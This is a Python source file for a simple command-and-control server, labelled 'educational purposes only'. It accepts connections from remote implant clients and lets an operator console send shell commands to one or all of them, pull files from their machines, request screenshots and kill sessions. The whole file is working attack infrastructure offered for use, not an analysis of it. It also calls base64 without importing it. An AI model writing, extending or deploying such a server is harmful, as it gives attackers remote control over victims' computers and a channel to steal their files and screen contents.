#!/usr/bin/env python3
"""
C2 SERVER - Simple Command & Control Server
Listens for clients and forwards commands from console
Educational purposes only
"""

import socket
import threading
import json
import time
import select
import sys
from typing import Dict, List
from dataclasses import dataclass, asdict
import os

@dataclass
class Client:
    id: str
    socket: socket.socket
    address: tuple
    info: dict
    last_seen: float
    online: bool = True

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444, console_port=5555):
        self.host = host
        self.port = port
        self.console_port = console_port
        self.clients: Dict[str, Client] = {}
        self.client_lock = threading.Lock()
        self.running = True
        self.console_socket = None
        
        # Colors for terminal
        self.COLORS = {
            'RED': '\033[91m',
            'GREEN': '\033[92m',
            'YELLOW': '\033[93m',
            'BLUE': '\033[94m',
            'CYAN': '\033[96m',
            'END': '\033[0m',
        }
    
    def print_banner(self):
        """Print server banner"""
        banner = f"""
{self.COLORS['CYAN']}
╔═══════════════════════════════════════════╗
║        SIMPLE C2 SERVER                   ║
║     Console Port: {self.console_port:<6}           ║
║     Client Port:  {self.port:<6}           ║
╚═══════════════════════════════════════════╝
{self.COLORS['END']}
        """
        print(banner)
    
    def start(self):
        """Start the C2 server"""
        self.print_banner()
        
        # Start client listener
        client_thread = threading.Thread(target=self.listen_for_clients, daemon=True)
        client_thread.start()
        
        # Start console listener
        console_thread = threading.Thread(target=self.listen_for_console, daemon=True)
        console_thread.start()
        
        # Start cleanup thread
        cleanup_thread = threading.Thread(target=self.cleanup_clients, daemon=True)
        cleanup_thread.start()
        
        print(f"{self.COLORS['GREEN']}[+] Server started{self.COLORS['END']}")
        print(f"    Client port: {self.port}")
        print(f"    Console port: {self.console_port}")
        print(f"\n{self.COLORS['YELLOW']}[*] Waiting for connections...{self.COLORS['END']}\n")
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.shutdown()
    
    def listen_for_clients(self):
        """Listen for incoming client connections"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.host, self.port))
            sock.listen(100)
            
            while self.running:
                try:
                    client_sock, addr = sock.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_sock, addr),
                        daemon=True
                    )
                    client_thread.start()
                except:
                    continue
        except Exception as e:
            print(f"{self.COLORS['RED']}[-] Client listener error: {e}{self.COLORS['END']}")
    
    def listen_for_console(self):
        """Listen for console connections"""
        try:
            self.console_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.console_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.console_socket.bind((self.host, self.console_port))
            self.console_socket.listen(5)
            
            while self.running:
                try:
                    console_sock, addr = self.console_socket.accept()
                    console_thread = threading.Thread(
                        target=self.handle_console,
                        args=(console_sock, addr),
                        daemon=True
                    )
                    console_thread.start()
                except:
                    continue
        except Exception as e:
            print(f"{self.COLORS['RED']}[-] Console listener error: {e}{self.COLORS['END']}")
    
    def handle_client(self, sock: socket.socket, addr: tuple):
        """Handle a connected client"""
        client_id = None
        
        try:
            # Receive client info
            data = self.recv_data(sock)
            if not data:
                sock.close()
                return
            
            client_info = json.loads(data)
            client_id = client_info.get('id', f"{addr[0]}:{addr[1]}")
            
            # Create client object
            client = Client(
                id=client_id,
                socket=sock,
                address=addr,
                info=client_info,
                last_seen=time.time()
            )
            
            # Add to clients dict
            with self.client_lock:
                self.clients[client_id] = client
            
            print(f"{self.COLORS['GREEN']}[+] Client connected: {client_id}{self.COLORS['END']}")
            print(f"    Address: {addr[0]}:{addr[1]}")
            print(f"    OS: {client_info.get('os', 'Unknown')}")
            print(f"    Hostname: {client_info.get('hostname', 'Unknown')}")
            
            # Send acknowledgment
            ack = {'status': 'connected', 'message': 'Welcome to C2'}
            self.send_data(sock, ack)
            
            # Main client loop
            while self.running and client.online:
                try:
                    # Check for commands from server
                    if sock in select.select([sock], [], [], 1)[0]:
                        data = self.recv_data(sock)
                        if not data:
                            break
                        
                        message = json.loads(data)
                        
                        if message.get('type') == 'result':
                            # Command result from client
                            print(f"\n{self.COLORS['CYAN']}[*] Result from {client_id}:{self.COLORS['END']}")
                            print(f"    Command: {message.get('command')}")
                            print(f"    Output:\n{message.get('output')}")
                            print(f"{'─'*50}")
                        
                        elif message.get('type') == 'heartbeat':
                            # Update last seen
                            client.last_seen = time.time()
                        
                        elif message.get('type') == 'file':
                            # File upload from client
                            filename = message.get('filename')
                            file_data = base64.b64decode(message.get('data'))
                            
                            # Save file
                            os.makedirs('downloads', exist_ok=True)
                            filepath = f"downloads/{client_id}_{filename}"
                            with open(filepath, 'wb') as f:
                                f.write(file_data)
                            
                            print(f"\n{self.COLORS['GREEN']}[+] File received from {client_id}:{self.COLORS['END']}")
                            print(f"    File: {filename}")
                            print(f"    Saved to: {filepath}")
                            print(f"{'─'*50}")
                
                except (ConnectionError, json.JSONDecodeError):
                    break
                except Exception as e:
                    print(f"Error with client {client_id}: {e}")
                    continue
        
        except Exception as e:
            print(f"Client handler error: {e}")
        
        finally:
            # Remove client
            if client_id:
                with self.client_lock:
                    if client_id in self.clients:
                        del self.clients[client_id]
                
                print(f"{self.COLORS['RED']}[-] Client disconnected: {client_id}{self.COLORS['END']}")
            
            try:
                sock.close()
            except:
                pass
    
    def handle_console(self, sock: socket.socket, addr: tuple):
        """Handle console connection"""
        try:
            print(f"{self.COLORS['BLUE']}[+] Console connected: {addr[0]}:{addr[1]}{self.COLORS['END']}")
            
            # Send welcome message
            welcome = {
                'type': 'welcome',
                'message': 'C2 Console',
                'clients': len(self.clients)
            }
            self.send_data(sock, welcome)
            
            # Console command loop
            while self.running:
                try:
                    # Receive command from console
                    data = self.recv_data(sock)
                    if not data:
                        break
                    
                    command = json.loads(data)
                    self.process_console_command(sock, command)
                
                except (ConnectionError, json.JSONDecodeError):
                    break
                except Exception as e:
                    error_msg = {'type': 'error', 'message': str(e)}
                    self.send_data(sock, error_msg)
        
        except Exception as e:
            print(f"Console handler error: {e}")
        
        finally:
            print(f"{self.COLORS['RED']}[-] Console disconnected: {addr[0]}:{addr[1]}{self.COLORS['END']}")
            try:
                sock.close()
            except:
                pass
    
    def process_console_command(self, sock: socket.socket, command: dict):
        """Process command from console"""
        cmd_type = command.get('type')
        
        if cmd_type == 'list':
            # List all clients
            with self.client_lock:
                clients_list = []
                for client_id, client in self.clients.items():
                    clients_list.append({
                        'id': client_id,
                        'address': f"{client.address[0]}:{client.address[1]}",
                        'info': client.info,
                        'online': client.online,
                        'last_seen': time.time() - client.last_seen
                    })
            
            response = {'type': 'list', 'clients': clients_list}
            self.send_data(sock, response)
        
        elif cmd_type == 'command':
            # Send command to client
            client_id = command.get('client_id')
            cmd = command.get('command')
            
            if client_id == 'all':
                # Send to all clients
                with self.client_lock:
                    for cid, client in self.clients.items():
                        self.send_command_to_client(client, cmd)
                
                response = {'type': 'result', 'message': f"Command sent to {len(self.clients)} clients"}
                self.send_data(sock, response)
            
            elif client_id in self.clients:
                # Send to specific client
                client = self.clients[client_id]
                self.send_command_to_client(client, cmd)
                
                response = {'type': 'result', 'message': f"Command sent to {client_id}"}
                self.send_data(sock, response)
            
            else:
                response = {'type': 'error', 'message': f"Client {client_id} not found"}
                self.send_data(sock, response)
        
        elif cmd_type == 'download':
            # Request file from client
            client_id = command.get('client_id')
            filepath = command.get('filepath')
            
            if client_id in self.clients:
                client = self.clients[client_id]
                download_cmd = {
                    'type': 'download',
                    'filepath': filepath
                }
                self.send_data(client.socket, download_cmd)
                
                response = {'type': 'result', 'message': f"Download request sent to {client_id}"}
                self.send_data(sock, response)
            else:
                response = {'type': 'error', 'message': f"Client {client_id} not found"}
                self.send_data(sock, response)
        
        elif cmd_type == 'screenshot':
            # Request screenshot from client
            client_id = command.get('client_id')
            
            if client_id in self.clients:
                client = self.clients[client_id]
                screenshot_cmd = {'type': 'screenshot'}
                self.send_data(client.socket, screenshot_cmd)
                
                response = {'type': 'result', 'message': f"Screenshot request sent to {client_id}"}
                self.send_data(sock, response)
            else:
                response = {'type': 'error', 'message': f"Client {client_id} not found"}
                self.send_data(sock, response)
        
        elif cmd_type == 'kill':
            # Kill client connection
            client_id = command.get('client_id')
            
            if client_id in self.clients:
                client = self.clients[client_id]
                kill_cmd = {'type': 'kill'}
                self.send_data(client.socket, kill_cmd)
                client.online = False
                
                response = {'type': 'result', 'message': f"Kill command sent to {client_id}"}
                self.send_data(sock, response)
            else:
                response = {'type': 'error', 'message': f"Client {client_id} not found"}
                self.send_data(sock, response)
    
    def send_command_to_client(self, client: Client, command: str):
        """Send command to a client"""
        try:
            cmd_data = {
                'type': 'command',
                'command': command,
                'timestamp': time.time()
            }
            self.send_data(client.socket, cmd_data)
        except:
            client.online = False
    
    def send_data(self, sock: socket.socket, data: dict):
        """Send JSON data over socket"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            length = len(json_data).to_bytes(4, 'big')
            sock.sendall(length + json_data)
        except:
            raise ConnectionError("Failed to send data")
    
    def recv_data(self, sock: socket.socket) -> bytes:
        """Receive JSON data from socket"""
        try:
            # Read message length
            length_bytes = sock.recv(4)
            if not length_bytes:
                return None
            
            length = int.from_bytes(length_bytes, 'big')
            
            # Read message data
            data = b''
            while len(data) < length:
                chunk = sock.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            
            return data
        except:
            return None
    
    def cleanup_clients(self):
        """Clean up disconnected clients"""
        while self.running:
            time.sleep(30)  # Check every 30 seconds
            
            with self.client_lock:
                to_remove = []
                for client_id, client in self.clients.items():
                    if time.time() - client.last_seen > 60:  # 60 seconds timeout
                        to_remove.append(client_id)
                        print(f"{self.COLORS['YELLOW']}[*] Client timeout: {client_id}{self.COLORS['END']}")
                
                for client_id in to_remove:
                    try:
                        self.clients[client_id].socket.close()
                    except:
                        pass
                    del self.clients[client_id]
    
    def shutdown(self):
        """Shutdown the server"""
        print(f"\n{self.COLORS['YELLOW']}[*] Shutting down server...{self.COLORS['END']}")
        self.running = False
        
        # Close all client sockets
        with self.client_lock:
            for client in self.clients.values():
                try:
                    client.socket.close()
                except:
                    pass
            self.clients.clear()
        
        # Close console socket
        if self.console_socket:
            try:
                self.console_socket.close()
            except:
                pass
        
        print(f"{self.COLORS['RED']}[-] Server stopped{self.COLORS['END']}")

def main():
    server = C2Server(port=4444, console_port=5555)
    server.start()

if __name__ == '__main__':
    main()
